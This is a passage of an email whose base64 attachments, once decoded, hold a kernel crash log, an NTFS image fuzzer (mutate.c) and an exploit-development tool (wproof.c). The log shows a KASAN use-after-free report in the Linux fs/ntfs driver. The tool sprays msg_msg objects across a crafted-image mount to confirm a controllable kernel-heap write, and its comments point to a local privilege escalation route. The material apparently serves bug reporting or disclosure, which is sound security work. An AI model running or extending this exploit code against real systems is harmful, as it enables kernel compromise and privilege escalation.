My4yNDQyNDJdIHJhdzogMDIwMDAwMDAwMDAwMDAwMCBmZmZmZWEwMDA0MTgzODQ4IGZmZmZl
YTAwMDQxODJiYzggMDAwMDAwMDAwMDAwMDAwMA0KWyAgIDEzLjI0NDI0Ml0gcmF3OiAwMDAw
MDAwMDAwMDAwMDAwIDAwMDAwMDAwMDAwMDAwMDAgMDAwMDAwMDBmZmZmZmZmZiAwMDAwMDAw
MDAwMDAwMDAwDQpbICAgMTMuMjQ0MjQyXSBwYWdlIGR1bXBlZCBiZWNhdXNlOiBrYXNhbjog
YmFkIGFjY2VzcyBkZXRlY3RlZA0KWyAgIDEzLjI0NDI0Ml0gDQpbICAgMTMuMjQ0MjQyXSBN
ZW1vcnkgc3RhdGUgYXJvdW5kIHRoZSBidWdneSBhZGRyZXNzOg0KWyAgIDEzLjI0NDI0Ml0g
IGZmZmY4ODgxMDYwZTAwODA6IGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZm
IGZmIGZmIGZmIGZmDQpbICAgMTMuMjQ0MjQyXSAgZmZmZjg4ODEwNjBlMDEwMDogZmYgZmYg
ZmYgZmYgZmYgZmYgZmYgZmYgZmYgZmYgZmYgZmYgZmYgZmYgZmYgZmYNClsgICAxMy4yNDQy
NDJdID5mZmZmODg4MTA2MGUwMTgwOiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBm
ZiBmZiBmZiBmZiBmZiBmZg0KWyAgIDEzLjI0NDI0Ml0gICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF4NClsgICAxMy4yNDQyNDJd
ICBmZmZmODg4MTA2MGUwMjAwOiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBmZiBm
ZiBmZiBmZiBmZiBmZg0KWyAgIDEzLjI0NDI0Ml0gIGZmZmY4ODgxMDYwZTAyODA6IGZmIGZm
IGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmIGZmDQpbICAgMTMuMjQ0
MjQyXSA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT0NClsgICAxMy40NjkxOTZdIERpc2FibGluZyBsb2NrIGRlYnVn
Z2luZyBkdWUgdG8ga2VybmVsIHRhaW50DQpbICAgMTMuNDc0MjE0XSBudGZzOiBudGZzX3J1
bmxpc3RzX21lcmdlKCk6IFJ1biBsaXN0cyBvdmVybGFwLiBDYW5ub3QgbWVyZ2UhDQpbICAg
MTMuNDc5MTg3XSBudGZzOiAoZGV2aWNlIGxvb3AwKTogbnRmc19tYXBwaW5nX3BhaXJzX2Rl
Y29tcHJlc3MoKTogRmFpbGVkIHRvIG1lcmdlIHJ1bmxpc3RzLg0KWyAgIDEzLjQ4NTI1MV0g
bnRmczogKGRldmljZSBsb29wMCk6IG50ZnNfaW5kZXhfYmxvY2tfaW5jb25zaXN0ZW50KCk6
IENvcnJ1cHQgaW5kZXggYmxvY2sgc2lnbmF0dXJlOiB2Y24gNjA3OTk2NTU4NDA0NDg3MjUg
aW5vZGUgNQ0KWyAgIDEzLjQ4NTI1MV0gDQo9PT09PSBpZiB5b3Ugc2VlIGEgS0FTQU4gcmVw
b3J0IGFib3ZlLCB0aGUgVUFGIHJlcHJvZHVjZWQgPT09PT0NClsgICAxMy40OTk2NDBdIG50
ZnM6IEVudGVyaW5nIG50ZnNfcHV0X3N1cGVyLCBkZXYgbG9vcDANClsgICAxMy41MTkyNjZd
IGNsb2Nrc291cmNlOiBXYXRjaGRvZyByZW1vdGUgQ1BVIDMgcmVhZCB0aW1lZCBvdXQNClsg
ICAxNS44OTc5MjRdIEFDUEk6IFBNOiBQcmVwYXJpbmcgdG8gZW50ZXIgc3lzdGVtIHNsZWVw
IHN0YXRlIFM1DQpbICAgMTUuOTExNzExXSByZWJvb3Q6IFBvd2VyIGRvd24NCg==
--------------PKAyRUQcrx9vZxICRyyPyijE
Content-Type: text/plain; charset=UTF-8; name="mutate.c"
Content-Disposition: attachment; filename="mutate.c"
Content-Transfer-Encoding: base64

LyogZGV0ZXJtaW5pc3RpYyBOVEZTIGltYWdlIG11dGF0b3I6IG11dGF0ZSA8YmFzZT4gPG91
dD4gPHNlZWQ+CiAqIGNvcGllcyBiYXNlLT5vdXQsIHRoZW4gZmxpcHMgYSBoYW5kZnVsIG9m
IGJ5dGVzIGF0IFBSTkcgb2Zmc2V0cyBpbiB0aGUKICogbWV0YWRhdGEtaGVhdnkgZmlyc3Qg
cmVnaW9uLiBEZXRlcm1pbmlzdGljIG9uIHNlZWQgPT4gYW55IGNyYXNoIHJlcHJvZHVjaWJs
ZS4gKi8KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUg
PHN0cmluZy5oPgpzdGF0aWMgdW5zaWduZWQgbG9uZyBzOwpzdGF0aWMgdW5zaWduZWQgbG9u
ZyBybmQodm9pZCl7IHMgXj0gczw8MTM7IHMgXj0gcz4+NzsgcyBePSBzPDwxNzsgcmV0dXJu
IHM7IH0KaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKiphcmd2KXsKICAgIGlmIChhcmdjIDwg
NCkgcmV0dXJuIDI7CiAgICBGSUxFICppbiA9IGZvcGVuKGFyZ3ZbMV0sICJyYiIpOyBpZigh
aW4pIHJldHVybiAzOwogICAgZnNlZWsoaW4sIDAsIFNFRUtfRU5EKTsgbG9uZyBuID0gZnRl
bGwoaW4pOyBmc2VlayhpbiwgMCwgU0VFS19TRVQpOwogICAgY2hhciAqYnVmID0gbWFsbG9j
KG4pOyBpZihmcmVhZChidWYsMSxuLGluKSE9KHNpemVfdCluKSByZXR1cm4gNDsgZmNsb3Nl
KGluKTsKICAgIHMgPSBzdHJ0b3VsKGFyZ3ZbM10sIDAsIDEwKSAqIDI2NTQ0MzU3NjFVTCAr
IDE7CiAgICBsb25nIHJlZ2lvbiA9IG4gPCAweDMwMDAwMCA/IG4gOiAweDMwMDAwMDsgICAv
KiBmaXJzdCAzTUIgPSBib290KyRNRlQrbWV0YWRhdGEgKi8KICAgIGludCBrID0gOCArIChy
bmQoKSAlIDI0KTsgICAgICAgICAgICAgICAgICAgICAgLyogZmxpcCA4Li4zMSBieXRlcyAq
LwogICAgZm9yIChpbnQgaT0wO2k8aztpKyspewogICAgICAgIGxvbmcgb2ZmID0gNTEyICsg
KHJuZCgpICUgKHJlZ2lvbi01MTIpKTsKICAgICAgICB1bnNpZ25lZCBjaGFyIHYgPSBybmQo
KSAmIDB4ZmY7CiAgICAgICAgYnVmW29mZl0gPSB2OyAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgIC8qIG92ZXJ3cml0ZSAobW9yZSBkaXNydXB0aXZlIHRoYW4geG9yKSAqLwogICAg
fQogICAgRklMRSAqb3V0ID0gZm9wZW4oYXJndlsyXSwgIndiIik7IGlmKCFvdXQpIHJldHVy
biA1OwogICAgZndyaXRlKGJ1ZiwxLG4sb3V0KTsgZmNsb3NlKG91dCk7IGZyZWUoYnVmKTsK
ICAgIHJldHVybiAwOwp9Cg==
--------------PKAyRUQcrx9vZxICRyyPyijE
Content-Type: text/plain; charset=UTF-8; name="wproof.c"
Content-Disposition: attachment; filename="wproof.c"
Content-Transfer-Encoding: base64

Lyogd3Byb29mIC0gZHluYW1pYyBjb25maXJtYXRpb24gb2YgdGhlIENPTlRST0xMQUJMRSBX
UklURSBmb3IgdGhlIGZzL250ZnMgVUFGLgogKgogKiBUaGVvcnkgKHNlZSBscGUvUkVBRE1F
Lm1kIFJvdXRlIDEpOgogKiAgIG50ZnNfaW5kZXhfd2Fsa19kb3duOjIwMDEgIG50ZnNfaWJf
cmVhZChpY3R4LCB2Y24sIGljdHgtPmliKQogKiAgICAgLT4gbnRmc19pbm9kZV9hdHRyX3By
ZWFkKC4uLiBibG9ja19zaXplLCBkc3Q9aWN0eC0+aWIpICBbaW5vZGUuYzozNTAxXQogKiAg
ICAgICAgbWVtY3B5X2Zyb21fZm9saW8oZHN0LCA8ZGlzayBibG9jayBhdCB2Y24+LCBibG9j
a19zaXplKQogKiAgIFRoZSBwcmVhZCBXUklURVMgYmxvY2tfc2l6ZSAoNDA5NikgYXR0YWNr
ZXIgZGlzayBieXRlcyBpbnRvIGRzdCBCRUZPUkUgdGhlCiAqICAgY29uc2lzdGVuY3kgY2hl
Y2suICBJdCBvbmx5IHJ1bnMgaWYgcG9zID0gdmNuPDxiaXRzIDw9IGlzaXplIChlbHNlIC1F
SU5WQUwsCiAqICAgbm8gd3JpdGUpLiAgdmNuIGlzIHJlYWQgZnJvbSB0aGUgKHJlY2xhaW1l
ZCkgZnJlZWQgYnVmZmVyIGF0IG9mZiBsZW4tOC4KICogICBXaXRoIGEgMHgwMC1maWxsZWQg
bXNnX21zZyByZWNsYWltLCB0aGF0IGZpZWxkIHJlYWRzIDAgLT4gdmNuPTAgLT4gcG9zPTAg
LT4KICogICBwcmVhZCBjb3BpZXMgdGhlIG9uLWRpc2sgdmNuLTAgSU5EWCBibG9jayBJTlRP
IG91ciBtc2dfbXNnIGJvZHkuCiAqCiAqIFByb29mID0gcmVhZCB0aGUgbXNnX21zZyBib2Rp
ZXMgYmFjayB3aXRoIG1zZ3JjdjogYW55IGJvZHkgbm8gbG9uZ2VyIGFsbC0weDAwCiAqIChl
c3AuIGNvbnRhaW5pbmcgdGhlICJJTkRYIiBtYWdpYykgd2FzIG92ZXJ3cml0dGVuIGJ5IHRo
ZSBrZXJuZWwgdmlhIHRoZSBVQUYKICogd3JpdGUgLT4gYSBjb250cm9sbGFibGUga2VybmVs
LWhlYXAgd3JpdGUgaXMgZGVtb25zdHJhdGVkLgogKgogKiBEZXNpZ246IGZyZWUgaGFwcGVu
cyBhdCBNT1VOVCAoZmlsbF9zdXBlciksIHVzZSBhdCBMUy4gU28gd2Ugc3ByYXkgMHgwMAog
KiBtc2dfbXNnIG9iamVjdHMgKGttYWxsb2MtNDA5NikgQ09OQ1VSUkVOVExZIHdpdGggYSBj
aGlsZCB0aGF0IHJ1bnMgbW91bnQrbHMsCiAqIGtlZXAgZXZlcnkgbWVzc2FnZSwgdGhlbiBk
cmFpbitzY2FuLiAgU2luZ2xlIHByb2Nlc3Mgc28gcmVhZGJhY2sgaXMgdHJpdmlhbC4KICoK
ICogdXNhZ2U6IHdwcm9vZiA8aW1nPiA8bW50PiBbbWFya2hleD0wMF0gW25xdWV1ZXM9MjA0
OF0KICovCiNkZWZpbmUgX0dOVV9TT1VSQ0UKI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRl
IDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNp
bmNsdWRlIDxzeXMvaXBjLmg+CiNpbmNsdWRlIDxzeXMvbXNnLmg+CiNpbmNsdWRlIDxzeXMv
d2FpdC5oPgojaW5jbHVkZSA8c3lzL3R5cGVzLmg+CgojZGVmaW5lIEJPRFkgNDA0OApzdHJ1
Y3QgbSB7IGxvbmcgbXR5cGU7IGNoYXIgYltCT0RZXTsgfTsKCnN0YXRpYyBpbnQgcWlkWzgx
OTJdOwpzdGF0aWMgaW50IHFuOwoKc3RhdGljIGludCBub25tYXJrKGNvbnN0IGNoYXIgKmIs
IGludCBuLCB1bnNpZ25lZCBjaGFyIG1rKXsKICAgIGludCBjID0gMDsKICAgIGZvciAoaW50
IGkgPSAwOyBpIDwgbjsgaSsrKSBpZiAoKHVuc2lnbmVkIGNoYXIpYltpXSAhPSBtaykgYysr
OwogICAgcmV0dXJuIGM7Cn0KCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndil7CiAg
ICBjb25zdCBjaGFyICppbWcgPSBhcmdjID4gMSA/IGFyZ3ZbMV0gOiAiL3BvYy5udGZzIjsK
ICAgIGNvbnN0IGNoYXIgKm1udCA9IGFyZ2MgPiAyID8gYXJndlsyXSA6ICIvbW50IjsKICAg
IHVuc2lnbmVkIGNoYXIgbWsgPSBhcmdjID4gMyA/ICh1bnNpZ25lZCBjaGFyKXN0cnRvdWwo
YXJndlszXSwgMCwgMTYpIDogMHgwMDsKICAgIGludCBOUSA9IGFyZ2MgPiA0ID8gYXRvaShh
cmd2WzRdKSA6IDIwNDg7CiAgICBpZiAoTlEgPiA4MTkyKSBOUSA9IDgxOTI7CgogICAgc3Ry
dWN0IG0gbXNnOyBtc2cubXR5cGUgPSAxOyBtZW1zZXQobXNnLmIsIG1rLCBCT0RZKTsKCiAg
ICBmb3IgKGludCBpID0gMDsgaSA8IE5ROyBpKyspewogICAgICAgIGludCBxID0gbXNnZ2V0
KElQQ19QUklWQVRFLCAwNjY2IHwgSVBDX0NSRUFUKTsKICAgICAgICBpZiAocSA+PSAwKSBx
aWRbcW4rK10gPSBxOwogICAgfQogICAgZnByaW50ZihzdGRlcnIsICJbd3Byb29mXSBxdWV1
ZXM9JWQgYm9keT0lZCBtYXJrPTB4JTAyeFxuIiwgcW4sIEJPRFksIG1rKTsKCiAgICAvKiBj
aGlsZDogZHJpdmUgdGhlIHRyaWdnZXIgKG1vdW50IGZyZWVzIHRoZSBidWZmZXIsIGxzIHVz
ZXMgaXQpICovCiAgICBwaWRfdCBwaWQgPSBmb3JrKCk7CiAgICBpZiAocGlkID09IDApewog
ICAgICAgIGNoYXIgY21kWzI1Nl07CiAgICAgICAgc25wcmludGYoY21kLCBzaXplb2YgY21k
LAogICAgICAgICAgICAibW91bnQgLXQgbnRmcyAtbyBsb29wLHJvICVzICVzIDI+L2Rldi9u
dWxsOyBscyAtUiAlcyA+L2Rldi9udWxsIDI+JjE7IHVtb3VudCAlcyAyPi9kZXYvbnVsbCIs
CiAgICAgICAgICAgIGltZywgbW50LCBtbnQsIG1udCk7CiAgICAgICAgZXhlY2woIi9iaW4v
c2giLCAic2giLCAiLWMiLCBjbWQsIChjaGFyKikwKTsKICAgICAgICBfZXhpdCgxMjcpOwog
ICAgfQoKICAgIC8qIHBhcmVudDogc3ByYXkgMHgwMCBtc2dfbXNnIGhhcmQgZHVyaW5nIHRo
ZSB3aG9sZSBtb3VudCtscyB3aW5kb3cgKi8KICAgIGxvbmcgc2VudCA9IDA7IGludCBzdDsK
ICAgIHdoaWxlICh3YWl0cGlkKHBpZCwgJnN0LCBXTk9IQU5HKSA9PSAwKXsKICAgICAgICBm
b3IgKGludCBpID0gMDsgaSA8IHFuOyBpKyspCiAgICAgICAgICAgIGlmIChtc2dzbmQocWlk
W2ldLCAmbXNnLCBCT0RZLCBJUENfTk9XQUlUKSA9PSAwKSBzZW50Kys7CiAgICB9CiAgICAv
KiBhIGZldyBtb3JlIHJvdW5kcyB0byBjYXRjaCBhIGxhdGUgdXNlICovCiAgICBmb3IgKGlu
dCByID0gMDsgciA8IDQ7IHIrKykKICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IHFuOyBp
KyspCiAgICAgICAgICAgIGlmIChtc2dzbmQocWlkW2ldLCAmbXNnLCBCT0RZLCBJUENfTk9X
QUlUKSA9PSAwKSBzZW50Kys7CiAgICBmcHJpbnRmKHN0ZGVyciwgIlt3cHJvb2ZdIHRyaWdn
ZXIgZG9uZSwgc3ByYXllZD0lbGQsIHNjYW5uaW5nLi4uXG4iLCBzZW50KTsKCiAgICAvKiBy
ZWFkYmFjazogZHJhaW4gZXZlcnkgcXVldWUsIHNjYW4gZWFjaCBib2R5ICovCiAgICBpbnQg
aGl0cyA9IDAsIGluZHggPSAwOyBsb25nIGRyYWluZWQgPSAwOwogICAgc3RydWN0IG0gcjsK
ICAgIGZvciAoaW50IGkgPSAwOyBpIDwgcW47IGkrKyl7CiAgICAgICAgc3NpemVfdCBuOwog
ICAgICAgIHdoaWxlICgobiA9IG1zZ3JjdihxaWRbaV0sICZyLCBCT0RZLCAwLCBJUENfTk9X
QUlUIHwgTVNHX05PRVJST1IpKSA+PSAwKXsKICAgICAgICAgICAgZHJhaW5lZCsrOwogICAg
ICAgICAgICBpbnQgbnogPSBub25tYXJrKHIuYiwgQk9EWSwgbWspOwogICAgICAgICAgICBp
ZiAobnopewogICAgICAgICAgICAgICAgaGl0cysrOwogICAgICAgICAgICAgICAgaW50IGhh
c2luZHggPSAhIW1lbW1lbShyLmIsIEJPRFksICJJTkRYIiwgNCk7CiAgICAgICAgICAgICAg
ICBpZiAoaGFzaW5keCkgaW5keCsrOwogICAgICAgICAgICAgICAgaWYgKGhpdHMgPD0gMTIp
ewogICAgICAgICAgICAgICAgICAgIC8qIGZpbmQgZmlyc3QgZGlmZmVyaW5nIG9mZnNldCAq
LwogICAgICAgICAgICAgICAgICAgIGludCBvZmYgPSAwOyB3aGlsZSAob2ZmIDwgQk9EWSAm
JiAodW5zaWduZWQgY2hhcilyLmJbb2ZmXSA9PSBtaykgb2ZmKys7CiAgICAgICAgICAgICAg
ICAgICAgcHJpbnRmKCJbSElUXSBxPSVkIG56PSVkIElORFg9JWQgZmlyc3RkaWZmQCVkIDog
IiwgcWlkW2ldLCBueiwgaGFzaW5keCwgb2ZmKTsKICAgICAgICAgICAgICAgICAgICBmb3Ig
KGludCBrID0gb2ZmOyBrIDwgb2ZmICsgMzIgJiYgayA8IEJPRFk7IGsrKykKICAgICAgICAg
ICAgICAgICAgICAgICAgcHJpbnRmKCIlMDJ4IiwgKHVuc2lnbmVkIGNoYXIpci5iW2tdKTsK
ICAgICAgICAgICAgICAgICAgICBwcmludGYoIlxuIik7CiAgICAgICAgICAgICAgICB9CiAg
ICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBwcmludGYoIj09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuIik7CiAgICBw
cmludGYoIldQUk9PRjogZHJhaW5lZD0lbGQgYm9kaWVzLCBPVkVSV1JJVFRFTihub24tMHgl
MDJ4KT0lZCwgd2l0aCBJTkRYIG1hZ2ljPSVkXG4iLAogICAgICAgICAgIGRyYWluZWQsIG1r
LCBoaXRzLCBpbmR4KTsKICAgIGlmIChpbmR4KSAgcHJpbnRmKCJXUFJPT0Y6ICoqKiBDT05U
Uk9MTEFCTEUgV1JJVEUgQ09ORklSTUVEICoqKiBkaXNrIElORFggYmxvY2sgd3JpdHRlbiBp
bnRvIGtlcm5lbCBtc2dfbXNnIHZpYSBVQUZcbiIpOwogICAgZWxzZSBpZiAoaGl0cykgcHJp
bnRmKCJXUFJPT0Y6IGJvZGllcyBvdmVyd3JpdHRlbiAoZm9yZWlnbiBrZXJuZWwgYnl0ZXMp
IGJ1dCBubyBJTkRYIG1hZ2ljIC0gcGFydGlhbC9vdGhlciB3cml0ZVxuIik7CiAgICBlbHNl
IHByaW50ZigiV1BST09GOiBubyBib2R5IG92ZXJ3cml0dGVuIC0gd3JpdGUgZGlkIE5PVCBs
YW5kIGluIGEgc3ByYXllZCBvYmplY3QgdGhpcyBydW5cbiIpOwoKICAgIGZvciAoaW50IGkg
PSAwOyBpIDwgcW47IGkrKykgbXNnY3RsKHFpZFtpXSwgSVBDX1JNSUQsIDApOwogICAgcmV0
dXJuIDA7Cn0K

--------------PKAyRUQcrx9vZxICRyyPyijE--
